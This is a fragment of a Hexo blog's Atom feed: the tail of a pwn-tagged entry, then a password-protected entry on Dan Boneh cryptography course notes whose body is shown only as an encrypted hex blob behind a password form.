    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>Dan-Boneh密码学课程之学习笔记（持续更新）</title>
    <link href="https://muzibing.github.io/2020/04/30/2020.04.30%EF%BC%88114%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/04/30/2020.04.30（114）/</id>
    <published>2020-04-29T16:00:00.000Z</published>
    <updated>2020-06-06T14:29:08.736Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="94f4cdcdf4cc581f53f1606c170cd417e838e6ae1ebdefefbf4dc8fc59ee7eaa">1058e9402bb5a28a45b22a7477be2adeae3d62ccadfeb0760bd2ebb41a39243989d62deca079cfb837a84f36caa6c68ef1931f79400bd7002c04fe330133a82e02a8218ee6bc1b6d10bf2a2eab74dd33067fb5bef9bfb6c6719ad301c768332cd0b15341094370471e9fc153b19120bf9756f6488a54bd4aceba87246963a6f43a82c700ce1e6e81219625c7656b6d650b5c6a3a91176217120f3bc2501532d25387f2b808d42ffe8268ca386e5b78776970b479f0767035609a67d291311ade5f7fd4cd2cb242046966f65a510f4e2dc7396dd49192453609d4951c4d1b61d8ce98ab46b876d740ea15a8482bf72b205e28225cd21c9548fae29c6cb49a230e1d32eaa4d2a91f44f2c383748635fd96aa591b374c219cb8922dd50dde9ff2f6d622a4c0b3e86d8ca6982f8a074c6491c9c9dc331a81ec5edd357611c07bec496e445189de001589cbc2b698a478c2857d335c3f8e47fc4b4177e51e05f3521b626a9dc3e66bc30e47400fe703e1a39d405a2287ac4f9474c908eaaf267e61f6fc96a693ee24830f29333017df63554606ce9c6fb40fcb954e19fd31ec2c9733ea0ce3df4f2c96eaa5ca6d3759325e72d0ee8545cea511e4fe939da13fbe58054b9ff595c443a68ffa0a9599eed3307bbae34bb00f7f730550d7092d20a820739289599c85c50cf9f2f12341bcf7910c2b17e4a0081fd35744a58be7e03ddfe72100bc82df4884e41e78bac3237a806668c2038cfc614dabed83019edd6f9323d7c5b44e8d34be652732fc14e10a5631eeee7935ac1fa0c78fe3158aede1e66f6d0fb0d6b9c96d078f63732f5822c7584a9865967f7f8410c2caae7fb9524c0e72566eaabf1805d033bae708bff57c48aa99873439fb9a9e53ea301dd1e44ed3c9f3594e4211f1463b410e5294cd00dc775308568960e873e8a3f64b7a34e572205d1f8ca31692795bf62d65bde3dd44a51e93b2c61999c21069a1979ffc717bf844c8ccd908ded7a336dee13166a00c2a5194426017cde0082047a28f459d19eba9231f58c6d313e95fb8539e4f41e4e8f8c789cb00b4d219c6df40d6605d412cfc877c0a0b3045546ee6fedcb631822ca0df1f09a1744a531428fbdacb8eb9b1618125186b1ee1f377d1d9a43cfdf79145bc80f8c58dce0bf0baa8d2fc97730c9dbcda0e8f33a97524216203f3be45705990c6952d06a94299941c573de3e7d46ed0c621110e610cb0aff438beacc668c980c6f53287ed2a69054e9857e412b3d7105c9c01950ec0d60055b58a41ca5eb13781819f9ec621eccb1996262ce72a9becd70ded3fcc49329d01665b5ec290b2fe3273984b3e454e39ad652df23abbac7bd206e23539d9d243c6673aaf274d05e568bf7a6c8850c306b59af7bb374e95105770f00a33508de22d3c9a3dda430d55f20a087bf0bc8fd692df38ee93ecd9e0015a77158f8e5a627a0dbf3e5ddb35f80ad501a7c877e823f890c174878fc64f3cafffd894a0821fc9c457ff50db530a0eafa903e461261c9f5f5adc273c473944ec92ca5f45f3429005ba0190a95517c0add0541234927bff549e66cd32035c51acf5410061a042b25c91facc6333d8223a045073e3872c3081dfd3e0ce05a17e959fa3d79d8a22ffac969b64c1f6432e0cb3d2fd11f0657c5a8c5d0d872a3fe7785ba97bd38cb60658a9020c59e3ca55344d3c44836e6feb1c3e1e2ec816347e072f09b6980f5909f25f36f479f7e4308f1c1e7704402c4f7ce34d1ed147782a47774d30ee263857befcdb52b8440782aafa343289a994880e0839104d6a1d06d52bd959d4656529f92e0ff1f0289102ba8bf3f7e889732a0fdb49cadee9447e4bac49de066c7444866432ae1eeb5fa22d61a973651b7b45f58bb9b348e78c8dcd73ae056f570f1b6591b12e0a9aef9536a307e615a98a0598e17bff3cf22fb9e3eb64204fcddb324cc13eefb301daa465d2ec365838bc338abf22e1a0e5e3c53f2f4b2fd800ddb21174dd8b759a5662baad03a0f5953e4605c35564d018018503fb9b2bcd0e9042b5ece75249de442daab2bc6977485cc6b4e8a670eb30f542a089709c30bea2de8ab44685481661aadcacc4fc984a9c545a81ff1b3f9d667336660c177be2c7b8d6d4e942f7d42a4c1430c587f1500756ecfecad2aaf13f2448772a129b3fa33d29e08cd34542a8ce82f26aeea29c15000650d52384f8943463746acff663b8aba255b189a92190a65add3d27750ad21121ca51fc0b0ff04e136aec7c35ed108e739654accb5fc35b17e7a1905c2c71115538e7ef8219c14698814afc312ec7e778f9d9618243bcee574d8630c8903ae87d855a9954ee719855800094fd12f2451bf8a2df57064f1cdc9a3f38ad831994847e5a0914640b2caf58ca9251b8f4f58df343c230057858bda2b5daa115f9d4bf09a418de5ea5c984028f56f01f4b457166c7018b13e43ce151cfd463177713db3526d6053e0b1f28b240cf28e01ed7bf19df620031667cd12cec08df28ac96840527518fd34dc4458574a5c62bcda0ddae7c47b1c550f17ccac0de0dd3753566da5e93a1e3ea6c9ed8bd8c8d49f40899abe18fd967e124b93eda6f929f8ad3a37ed661aeb8d8428a869dea2a12127a4c7becef7c6c295474d5ad1d7bf061b025ef7ea3fd1db3a2cc701cd22e4a8f7d4f109c58ce14f4cc0a0570e7546a59517544c8d15a0b7e666d32a060765bbb5958de2da50111c63ff39e4b9fb8a07271e889286802677806b694842a59b8b7ab6c1a811be67cd110426348ccc5bff5a10621890c2ecf6a0772c104c0f9984efd39baa0e0995caad88a8d49985d9265ccffde1617da78742aca3b1b9f5e2bd149fc7bcc4098c9521896fe19553b81cb7d817b2a64789e1b99d97843eb00434e50fdd3835ac9c5af3028f3a6dca7cd4caee06e628128003c0ed3edd7f38e37cac39aee7ce8f06264417e139e5fbb5a1a5800668ceaf0d64823b88c812ccb1ff9311fdf8292db54a092055766b5cbd8a317437e300c78c726209cde383aefa0031266c19653d322adb73999603bdf0badc7df972dbfe8df874e5b515914e49d3b050dbeee681a3e2b3fb57af39b839c91bae8ad590576dd4c787f90af360c57adfeb22080bb114b834263cb9c8c39d1be1ff8906d42277ae62fc05264a2dc4f64c7c8a0f05892f40f569c7491a00c8c80f8d0ae127d55f2ac66a2b507dc360b71bf2f47cc202cf0194a8bd4a9105a792200e2d7508e0a91cfd896b1cca9014718be673c1bdfdc0da59a89c9cfc337ca9c26f0eb42fe81cf0440cee51c57e98d4c9cda516574da9168518ead14b3354880e656be667c7114045c5088f0c07e3e96ea94f49e5505862d64bf686cf676e28c44fdabfc862872bc48621728541375bba9230ad32cd7ab7dca4cb48549e076249ecc60a425ce9a7fbd338e39c96bad4491919c9dfea3a09fdf4d89199d8fcadd02b9f7e7157ef2e524b4faad7dd2a412bf4a0aa79846e48919dc68843079044143edc199dde8192537f12771b5a19b8436d7c382a18611e9f9be9bf1890dce4b355415bb5cdc5ac6a7cdc03c52dec47e55fefc5d5aecf69d96ba20e1c295d01b64f59bd225cceb69de91d889cdd1e6c8e4db0f7336900b40a6f67ce2948401b8dd28ee66de066d1e1b07b3eba1db103fe20dc5412235891caadc792adf173548462942e334368ed9eff1dd6472b72c5bdb4d6bb5659a96b1294e4d4f945d3be77c590d5c4f3644f58a9d27963a43c2fa34bd3b96d08edb314ed90f6bf7d2f3665c98a715ff3a553bcb3bf3ee238e615753cb5cb0f28bfba25e10db3790cc7dd73c76021cf1bad3acce37919417624b5753f9ee4add63f4fd0b5a8ac1fbcef20119c7652a5ca703cf78c8ef8e9a0880b5ee34f6139e878c8201a3325ae457c8311cb0e7ac6f04a22a434f1824512e35483e62376148cd453b33bf46531cf54e1486649e9048a6acc454153178a9b3d23e2cc7539ebb55032f6b47e74fbf7e9497fc58eaca17cfaa87113c8dee670a476d54914befeb381c3ee1b8f345db203934298cb935899c4dd5d75323dcfdb80a28f63ee21fca86e9e5c6dce06ac28a27d26f87deae07c97ae4b31f0923cba72615fe6072330063034e417eae53340673005ac49eaf8d5694ae4ef052a98a476fdf0c7aee7bcfe911fc7fb0c8809cb37060007325e2c0aeb4960a3f35f8f43e55971e2fb86db07f6d30fd22cc3ce55ef8f467d727cf49fea34b71ae7333d6302a800f89a118a0d22049a49c5b6dbb67ab314ba11969791f11f76af98d19f3214afbeaf67872c71d4acd8b6ad799f340e842121e1d5295a277830036a312c8004db0d13ad1de7b53ae0bc70587e01f587ab1354f13ca2550370b4a10d778f3be277e695cf4fab4299e1c41a365fc290acd42cbb6c01e1828bded7d46c72fda88aeaa2b196c4339a880ca482eeab6c4c54f2e15b300b0cab0b1996d41d92959f6b30a3d48fd9bcde93e5af99a60bbd719f059bff3c872a5261f52c0e117aea060925504a59c5115f23d0712db38ef4961ab324855ab9754adebcfe2b3ea4563459351172847649dd2dd8596ca06f82521c5a98ef5c46adbf519c45e49cc19974d6b92e2b97ca0e30ef9fca42952d9f5857cd9e34673a99206770b03b90d9818a45072a97eed88bd8680d0b67881c01e69074d24a8d897225cc33c5113531849a985e88e1c073c1f899b85442406468034c195a2fe04838f21745c8c96346411a46f9702bb00cabde7d2e8f31ad0cf05440e05cff56518f849db58ec84c403073e6fcb72d90195a6b60d81d77964de670766b51e33d6d88c9425a70e9127b7af329739b5d7f319f637b0b02341cd003c730e61adfbec725c52f3971ce2e9a9b296ab7a88919b2e623f21479975d6c27f955f6b7d31b31b27cdf68094f1eff478843575ddef4c03a6934fba7eb59309b5721526a56fe48d0cc9591b6df1321f679f331e0f1ac390e2e2b96f0b7383f4d90c7aa6daeefb6143089ef902ce7107e7fd6b5a79dafdc60c1d606530e505b7cf43e3bc9f79bfb0a346893c2ac90760538fdc6618c9a6065e3d495c5265257f2898a649fc86e7ba6d6a7be4443ffd13263e9efec59de2041c0120caaf730f7c4871c6976b5de8ac17ba51c2e86446ec73fdbcd215d8df46cedfe70a895c3645619951d7b59d6d487ea67d2cf87afd7e2a7e6693e902abe5d8c167a27f4f7df375e8182c1c98b3f9fc64ff1dc358a71247e5d3cd958e0cc8db5013575e2177df3505cffe14bc615f731a474f2a59dab78d8943610130a78454ecdcf3fabfcd507b05dee3e5db14ba8a2a46ab5df707590b5ee0d00b6bb2621a0e9b3fd5c6c942adfed324932aaeb9d2586ac3c40cd1c8525da9fa12b9c2bfbd14d279be779f0f15a5188d53c675625d735017b7925a163984f53d44998636479c85a08d04e882fae6b5372418bd65bd6d0d4232188d0a3f9d25b791f174696af01df24a64322042390ea48e01d84f716dfef4db98857c13465de6ad9cd473e8e85172d14074dcab3ff37d165928a8d4630f2876507e14aba4e0d1a23a5ca6f10e3d8541f670eaa79fbc92a9fdec0c931fb8105941a541c85dc2f4d383d5b510467ea78d32c9660b91f07d390ea8dfc57a038215f96741ee918e1207e646749373d545a4eff71534b5fb8a835db59b71c05a0b59bb2b5ef1328f67cb2db4bb80e2d971a0efcf92c3f7d2760ad16af906f1644dd4eb74e65d52b6928086cc92c0d2043e9bf952e754d775cce99179040b95f6ce836a7663ef46e5752e692b3e7e9ca1704f9d81d8079ba351614cba034a742df2eb0c8dad4f6b7131251756d3328c8a38afe4b7e259c61ce7362f5707d807885bcced9d0e7852a4a30f3168b3239b521d97ddd213c09b91e8b9986e958fd457c2b4c631556192dae805a0df44b433c092d69c9361aa71fa188fd37e57f30e35929a4974a78c9e4cf30c9f01e2727f1e4bf810a18939651b67497bd7fd475c905c4cc4e1d9d19a1943dce2b108a82111a7d97da076c12084066952c4cb74af01df88f99c600712872a7b6e36b54cc7b392104c3404eec353bf876edaded433dfcaf526068bf777bc0f3fae7746cf57170adf0f7de232c768059a630f230149936a31bd0fb4e589f76f51ad2aa8b51eaa46e21b7cdcd3652a85c2ba93fe69646ea7f2e98de93b1babd9c25142de4e17ac2d35cd4f342bdab890a38855f89ff38e8e18cf020c2a807b1425e2bf0728a66b56e4e1c641a4095961064658a517176658ff6cb011ec305e7152fd2696a9b11ec0cec1fb99d92f71407cb8db2cc664d098fa6ef5237b1166dcb93cf08539087df3291093ec9b545fa0111699c72f904a5393676bcaa05817d1d9a2f3ef7f32e445f016d0fcbd95d07edc8c74f6a831652692dcca97d56de3db7b03d8344ca5d67681de4c0dbfc2a9647562678e456142dd06c53037f1028d9ce9eaec8ea641ddb24661a170d22c59626d7643d5ade98b0a54969abb4ba7b87c4439f992e40e5e602654283ad54822430129853a035f0066910e4cc4edba180cb011cb4ef84842054dd5e35d5d74ae07d14bfbf6488248a02b96d3a8e8412a38ae504ad7d5e32d4bbbc69427483bfd096ab1eb8595e745274558ce94f31e1b425c0db29f16f8c88b17f1abb869dbf41bb57c923f7514a04dbea6031e3b8a218ca8b125a734c44312dd0df0fd6fb9913283151307602e1b57449585fe498d35da44f9069410da167bfd7aaf20796a7ce74ad0c6f57bf0f17aa6c9f2e173d674c2aa7150b26fdaf0abb90bfad92fe16bc70dcb988b6be89f3cd4a4871660acd8dc076b6b36307ef1b3e125b4094f9e665692fd4cbc79cedd41957a024e29f524f97fcf21a64706b4abeda4445ebb9aaaa23835e086b40ed9823634212250a5a099a608989ad9de9de618a497aa61ecd32011d0ae02caeaf6ced91370487548401a0e9182eaee01c7b08170489c33109770029fd9a7b5785558681858ba457e0ce4bf379cde701d82c91693de3a0466a57fadff7eb360f6db9007420f48bba22a3971ca823d5ec8da447a5a3cf8fed41242e1d69647e5ca84722c6800337b2b06d0da2112da1ebaf8b0c205220c8fcf3b2eac2c78ea3231a46a1ca359607076b691b74fea9368472fe7cdc07a310e0362425c687315a6d768dff11c21c1233d10d6cee50116ffd2df2c1091f5347b08c1934b0505f5fa724a5bb4b507321a008db4aa76025b91dce1d855c0e20bcc54c275990c731caeaff2bda378c8003b4866ffa2cfbc815b7163b97a24d8061a19dd0e436a3560bd666e4b3f429ea19b5d8d872d44d115d2f9165932dcd055b4cad299b14395fcbcd98f88651d08989fe3ea2f3956f4f17ab9ab943cdcfb0557ee207e13780eca48c524350a9a8389296234303a46072ae54923382bab838fe32c851279b63599ab71c9d3f2ac5effd5a0600680b28a5fda1a9a6b5cc49adaa3673134f148c749f9ae4dbc914abdf1043c5f06a716bf6742b20daa7c9e97fb51d82e6effa34be4fa4864ea946889be708c4d8c4f445e95d32cdc691dad3a10e4a8908ec97fb3bf5e4b794eb926436ab9a84ff41006f66be536156dd693667131ccf2d2d80689c0287307dfa9c763fac30cda3908e90fd2498e8b0468d8c482988dc16ab0bcc6eb89987c579341b9c521dc09427cf05d17ba1e5dcb091fe5c93cfd3e8bf76dc8922693e94cba422d13b0289912be50358c534631e0d036249dba468868c6f5bbbfcf2a4262ae3a70c49591c74bb977fe820441a58fb32dcb178337d4f9388fb289538edf3fa880de7ea3c61bb1b8a9d90adf099d276f8c518347a6e55652c1444ea33f82740b163f3850e34fac3826feb03af9a2eb8230b99b387febf56004b65b3202814490d7c0f4eef811ad7823981d76b687bfd9a10cf5e3844c6e97be40e1ad5ad3b6d386656ecfda0b47b091c60a61dadcc1db855d99086283dab170358a9730a1b39ba774711096b795481f23fadb64efb6a6d96cd5014e2175b8110e5f3632296734ba929721d3e2933b997e6bae13d7260a6eddb572e1950ebc6ae4a0bbf0eb898ad549c09b7e3192338aab5bbcf3aedfe92922e6c0175fbef64ac08081f1eb157876db35cb7fcc65af0c1425c942ffcf71254596e42a4917aa244bb8d4fe0f8658f7873e5cf8ec437441a31ab547a0de8981671c6b495c5f3807988aee53c61f5cc386ce269ddea8bb572a2bd8d16601d31ff110daccfb63f26099740b6953dd8c837dee25ffbd799f3df38ea151bef3e507414c3eeea2f6618c78bbd608a7e7181de72567c6565c1e25a89c13cefe6dfd05b24e4da7ab25b9ebac1fb3048acd0f128432e9ea8b50dd64791a025195b4eb9425852930b66588087b758495bed7e364e20fde9a62fe5f076ba618c8650309bf4c119ab91d5bb78d24b45db7d67ee080fe66a8764701db024316a88eb30c22562ada7d1ab2c1c55068808c980c2d7b1ea89f34da106477039fc7b3714c85df200328e65a92d7384c84965ca2ce23d6b44a88457ca6a1a920ed857539f943c24f4fb7121e7db4a76d94b745c5b910303d37510b8e3469cd6e31175bca4537d4f058db8362c686bf191b697217df5068a112475a7f0cde36df1bddc9f475e47c8d11c387400b3733879730f2956848b6bd2b8c087702aa68b0212e60dc2f91b40d7eac67bc62287ebfbd9fa06fb008a8b627b0aec41edd74dc3c4f9593aebf319205b4e5e9f6f745692c7e752bcbd680c9b678e633f266006993f22e3f16191b561f572b5c07f32a9437484566a76ffd5648a7ceca6168f8779c26155da08e4d0be85405bb84cf56e8fd32b952b44cd85eb1cee19b56c8b31a837f5f0c69b26046466ac16d1dd7cdc6f7ab3306b20cb0280088e4384de9b000e2636d230fec704456067839e387738d938d3f3dea05b18242e43acbe37b106bf8421b1cf55dc7334ce68ed1048089037e454ed7dbd1941e940e53478ffde02b82d80d65e3be9a32fc1f7379f001313fd399bf9f015606f3de4d2e6ee66f304dc28cde0a1a0e8f9504dc84dfdc92a3243be34c924ec83ae9fc78db2062e94489330cdd24fbe0782a07078dedfb93ec37b3ce761594470298a960e503c33c5464c58213701739ca8d7e5ff84979b86acb6e320e23f888a052a6f4a1448b5ed3ff1c2d5ac4eb8389ba1bade2982a52418020df90df747fd7f65caeceb0efa4d8632e9cd466f7abf7b445c88780b31911e78c15d368f24f1bb7765ae4a49b6cb9f284e70da33030f627f58a59179a282f1f06596bb0ef5de9497fa899fdc80ccea2bb549bd505492d6fa7e83183a24d10461e43a1ff10b9a0c1854b63706a9f287687de68a56f7a7679667b03ae32de15ab202efe06570f890272df34517b8307db243ca86193286afb1df73ddafc439deeecd1643bbb01f56fb1c7a18804d2553184971be311a091e45129bdc1ab6c64967a8e53e6bc90c3861a3ae84897a2b4f30f6e1d08a9320c0e8c12bd3875832469de507dc54f6e073be19fed5a70d6a166dc214d992cc7629f640474c6327b8a9163bcd5b897fad5ae8465384c0b67ac8b98c2c75bcf76d0eb98ebdf2e10397db46302ff1f18b5d795aeff4e1630c73b6dcf8d31e9fc5d4e3da7107b82d78a6c1eec1b7ccbcdd0a4e15aec658dbfcd6f91f59cb1f0d9d0eb20b5b7cb5a467be6bb75c43b99cf2c768a1da455fa95faa3dbe21f3f1e3c1a860c8a382a973764e539b2c8a6681cbe66a776ea3a82c82fb587dbc9c99b0d19df36212ce647a79654a7d4069e84ec3535d067fca6d48ea2defe6362aaac7d7c7a5feec048801c0472b6131de3431de95ba423b09e3d57337fb458c1ea94fe8e552bde59b99b936c1ec211e6462560e2b4b32ed36dccc1d8719c93eaf88bf47d80b740d94b04acd7ca3a56a0b461a8c868eb8832bbd22fd8ded554ccce0d4d522049c862dfc42251fc98999a0261ae133938000fdb55ea22abd0cfe0dd439be5a9ec656818c678532eda8b9fe78bb6d1f3f9b9f5d832ce0c9f0fd02eb03ab7e7ba1e7aaad2371e18fde3cf84ed6cdaa445dea07e5911a84839d0e56abd3e156b0330ef187d9903541bf8daf4f793862c484de48c0883b7dcf3a2acb6059afb4c5fd6ea4d713833618319bee7e7f690e12f6a4b18e03c3df37698bf761777fd99b5d624c5dcce3cfdf678d1c34e2f686e81414dd183b8265c040c14c35d4979571907c48351f814b57ca5b93a0b92cecaf5780000102d3ab3af0c4e635ce810052e877c3ff170336742185116bc82a5dac0616d841c15ceed3217e9ef891f38478d4177838f4fbbffc8e9508465f904a37c4fc806f3ec74441f2a650ce2b6977b9c134c2acbbd5255a47207664af6bf26881eeb87365b00645d0700bb84c4819876a417f793e644b76b4e219c449b49a2d000c9834e45b88a505c29ac17339fc3f89f366445b3476b2a4b59137f1a0cf77c44bad55af1540011356c75fd6f3813bf9989f2a0f52f61cbec9412bee85b797d9725e2c4bec12d5eb44e1a28f2dd69e1e827f3da154b021c25483fcbd2ceeb6df6661868fa5f05327d4e4f402013a00054b82063c5a7b427a6a3259c462ea0ff7893a7883a123aba61ff96ac42f0d96fd67b63fd2a3026e74c58335ffebfef21979fcf88572f34db2b7aef6c7e79da83bfeb2f3ce29eb12af65e1cd03604036dd5c13c2db3277b45d4a6d1923541051c6912e3b8c904c6bd0b39fc0a8dbad42c00c673f2a31f1b9bd17a30eb3fc06808c32333378eb9d8798375ee3338d0b421a875ffcd474945c95ce44c5729c144f7d3e82c842ba306dc53fbcfcfecd32418be624126d497e10de1e14f26833e9472fcc10a509e5938052aff140032afa2632caa0a59f74d015364926d1d80aaaf7c77e553c15f1432f0803366243edcaeb738973acbb83a9fcf4389e2887abcc004e97ded8448bad83f870f9f39ffb15b62d2fc9eb133a1caf8cf5fe08c69e775a7d55b25eabded6f1d641e3bd8ee7a577947f284fb5e1ba559074728d39337e37433423157d413f7a027c636d4f1f72580d5d6eb1c7554c83c7c8199c486d3185f9087a878d8ce1d309782983cae54209c8e1b9314e508c52f655af8787b46380814b13b4392830c028e75546faf0810f45eeb7cbb18db709a99c9760c5e09a310465749ef4ed5dde36b0da3380c78ad9b44a6d5b60d5561fab0bea87d212088f0bd1590bfc294ed736e031d74d897f73ed4287fbdaf7c38c75bfa893f7dfce52930ac5f7cd90bfd7786627f74815f2917fb2f7ad4b1b00da3a9a4a65985eec2a75aaa82c8fde2df4d9caae50af55fae5ead30dcc7126d7ad79ba2962e3f25a1689c56782f8eb17b6d6807c0b8dcdf3788c812f9431549242aa02a1c8e8fc05c5ed05a06d49a051ec50b8fb1d391372b5f854fc90797f17a0e023c2946d26d6350bc08d157450fd03ad4992538ca8f33012c82ec594d8c9771424f561b66abc66dadf15094cdfc04c091cbee79bf617e5827d4a49063c5448651c4e9c01d90a5c4a177c0119713e1cfa1a1c580082f180d3841cde88ec3715a50fce893a42a4fad4ab579921be066e89cfe15bf3aac0c4adfce5185b6908d99559e3d3fe7b6e1c4e296f40d4f2a44727bf9500cfd806feb37f817d6128821a064bf3a753d476c1cd410b3f4d2e059d3549bd2d7ab93ce2fd5151754347b9a955d5f7ce3633ee32c6665fc1b420375b4032834f0c635056d6450a1cfb53068eb05856dd8d9dc1af8e7d2289aaea4b15c6067c7cc6c45765e3dd852b70697462ff731db561bb403f00251bf2f49d39319e0df2d58dd370423f7f8681d9031fda0f0a04290d84c780130e3f4e99dc2ce520415be1eb698e2ddfc607d40dbf742d31c4f9234a5b012cfe63ca4a6fad3e2e21451aced1cedfaa61efcc9c8bfc2afe5432695f9829d164f1ec786eb93cdb0d881de649b941040b3a20b5712625e8fea9e78ca66f9804d6cfe9935aa53d0a135b15fe7946c5d41be2d07343044b82188fa21a97da778fa57ff83f12881c4d23462216fb95c43b4bf620ce1d5ecb1a7912558c25b4370172f36c8f6daee1560d53351001a8c1337a71329aaa6a714b610175ad0c4873c958bb21ccf013f7de49b1fa7f9ec24ae81415ef3c8436ce58e8ecacbca9c87537a5e3bcd087eb6a11de7ce2c9141924aa876de8bcf0e2d2d8c4f6f4867db14839da3b6b0ee864c3c304fd97ef538b4081eabc873a904a2e266b29cc97ca984adef300db7a50768a6a3502f1f5cb47c9e681e3795b22a82cb8cad5e35bdaeec3c68b8311665754cc43d7649adaac9ab4e38a888e6b20ed5e8b05e08f9fdae2b7e7f79035abcdb84b00c5c891a7be80a101c8ad01954ba5bbaa21c413020dc9956dd9066c11136d58e3b3494ba8d210c4b068d5a9f7d3d24c43adc60e4b607922f9c2f37fa2c1803aa081dd63917165c3363db92cc0edc33bc15374da071df69e3d22faf65265d49d2047a8aa6b69fe77f2612b9fc3162f6d043a7b38009cbe4a6dc0807e8b7975d2f8b35fc2de144c34cbea47081c7b527e7eba69876fee89871539a9d6fb29cde74daef8036733c311ad62c45e054b499e095bf0a4d92f2889c0c54f101bf353219913ae7a4db67d8b02d39bb82f44a11433f7edae98860540dc14392db78b55e410fea750a3a3289a317685a930d888a02dd7a28adc61f4df425f034b0379ab9068fd5800395b58ae5b155eee5e3166e420006f9744568a80a2c899e34990aa7efab6b780ffed4307520f00ded35effb76f4df2fc0f08815ae2bc1de5345de96aacda8b1aafe635cc9b90c37521081c27b03fb54a03549a1bef962ffa4740a49518ab611f795ad9fe0211c4359f020a00337d2d04529467838b0455f62af9da159a56de9801ca908ebd8b16b96a5fb807cfc7c43cc58fd864792527f3328e195ae89f4e6976a9d174e0da62a04f8b6d6b04488bb8e83f9ce1dffde8293f313ff6ca349b739de416ebab6a9ddad9b79e8f432b00c5e760f632ef53bb3ac5b542d5351f39d9eedf6411810d899502d08fe23badf1df35a05532ba0bf7264e0c64d71935fc42fbd819dbf2bf13821ab0a80bee87fb754d0f306aff14a3b102c9882c4179a7c880d82f6aa13a92248bd668915601c3b0fb6fc45d95b501fdf77dd02dbd7784c9584d39715c572e6f9c2e15514293b376d31625eb6fdcb04ed30785c4ba5b25780876e6c5fa1e4409d912f4a77c0088823d70354291938d3d3ab56193b3996748e86d19e534bb53834f544f1b8b05d0d37d75aef52bac976d25e234306bf7ad6b7798605c31cf3820de203aee3a062c52862abdd16862b2d8dc1fa13301c5dd2ca8d098e3391181afc5c9b57bb54172d01a84eec0333a5557257495c4a96a9a1e650ae268eacf77617fd177e768e66cde9ab8f1b2ab3c0a9f5215a3e89626179231635606476cd7de9a02bbdd67fe6b91cb02e99e897d0256415f32d17d55b25d8d391d255039ba531be6d7774c095ec0a4378aba0e52044486860af8d6df5e0eb923e50f8564e0b4fe15f998e52859993e30c730ce3f0031ad8eeb9891147026cbbf342b2b2ac24c1f8c357f09e834ebce253214420089696eca61822343e065260123120a923c41937f29c1820f8a7b27096cc01538a8e2f86eb6b06a7ad66bb70ad3cc2687d9df9104c4b7872cb9b311aa4be5c28bf59a01f8a7a89b5e6fecb1e40c531026aaf2b1fc0fd7d3db8ecbdce11b0397097d88552129eb8007b0e30ea0df71465962b1590bd1f8943d9c9525de536ee988ee5f16b46a43969bfae32abf25b14ecea27bd193decc0eb8c2d4d4b42a65052d1bace8af8285751050003eb33bde8008ea479528dd7ee3753ab9f4266eaa3279ed7897a36aa1d69e4a14462a4aa999fc761cf89784e18c4d8835521b335bc885dd7cf7010c94a270b633ba1d2b59687dc3fd5a2342dbf0fe8c2e3cd26a7a2a38048fdaba0ebd6c00a75a0d2400cc81809368468f7c56497aca8cf541d86fe886a9f1f8c8cb8c7dce5e36cbd3b310b22bc8e30c3963b0536775062b5809e1af4f528c7f7957401043a626fbfd5025bbe1f4a96ec7a13c30cd900edd26c35a4a3b65f69850ea1e214ead662fb78ae823e7f285bdb6f379ca6ec8365268f781cebade48ab6b15455e15fca3e190cb0e27c20ee66d172edd9717ca92f682714dcac2c66885dafb94e58c5d694faa94d0c9f690741bd02ba2743501e7a16fe759a396fbaa4c3cd760461ee00f7340188c042bc92a93872c4040600574168c99769f0a57c1d3681d366de641a089842cd18446bd0a3e3bd60fffff27ad911d3cc02bcf50ea5f4f029f541dc452e734cb6a7295295701f4fd076643709227d92936c89b1f54b37cc9f1ca159a788e49f173810146aca54066d8caf4516a7a5688c78be308bd2ac3683d3f844bf51cff760c2c1eec48da67a58dbcab4200917b0de252df334770fa05d4adc3000a63368af44440b3aa400944b500e0e38298b36ad86db6bee26134eb3a372c04948849b227f40cbdee1a4215af7cfda105314c300a771dce4762c621f7e56a900700b722bb66f7077e75c54135f34922743c52e391e490d262a67ba4e1da274fe67ffbad6427865fb6e4ac1581f36bc25d0518cb6b2eaaf11b2152127948bf8ecbe6e204bac689db0a14ceeef4a631456fff540ef323c72415e0b23625cf765d16b86a935843220578587c88db0e52bbae337525a6158aa4c0ae63315473ab06c934a50179fcda7f0d114e55ae4159ceaa7c65f17ad53b9690995af229562e5c2e57ed8493856e3f3ab3b498103fae9c0ed1850f9fbfa56a9b1f7524aa1637dbe22aa8613c32ebc9df670853fa1f36211714aaec5006b4ad1cf7017ef4094fb2b98add7a05c8755a450f359baa119790095d647860cf70457dffd9756f5ff652a80ace26bcb87b81cbb431b67ccdcc02063019ea6d54bbeee79229b7a76dc27a5a4f8bfafc74a7f31196c999a6004d86ef4f61d13003dd5d4835fc6d0a06aa3ee1c919a9bb37a82f640971cfea7594e25c782ca3aa181fcd60785537b10c36ec5f100a388c838618e6b283aa23f669082070ba5cd69581717043fe8ad35787fe9a8d8cc4665dad38238c60132ccb3b9c455845c6d73bc7ff10cab26579169f9c05ee3b482be7c61f19048e09ef7923fe2821db577098ebe22eacf5c4602e227136419cd9c03186d9d6a223c2db75772bb20920e329dc7ab15230a8a5c9af89499cb00e10bce6e024ac37047bd8c08c0600ea5145f3e65db6e70f250ad6048e22183851883fefa3f117980c8c6b3425abae61d9bbbf608a050c487fb71f6fa8d1cc5f76498b85698379fbafb8a2d3dcc71c0a935d915c5513455a714dd52e3e074ab3434674c200decb9ef560bc961ea987bc58386dc612173d9c808f2cb17bd32b099d8b7b06853e4c60e6d7919057999e890f98bc9bda20fbbffafa445ce9802b9cd68a8f7d39bb6bb974b1678df92795721451203effa41322e743a736428861aa7a6fab9d5751ee6b082650b185c979c6637b1e99ed824b9d166c1ebf5163496a03e4d4ffdb9037d88219649f9e00fa81fd5da35272a6fdc440afc7da1d903e64d28fc7b1d180a25d3253573ad219c7e6872ea7f483d9002b5152523df683f9d662204d22ff349103a5b5d74ba8403d0facc12622996e4294414ee849cc5fc384d58d144ececdbc1fe904909a28a84fd834ed42a879a95d34e98f0dd5e077841cca4d14ad0ee4462e7ec193642ca92d29108ce6e0f8612b8f13e87df7f5096bf0072642d189eee549245b9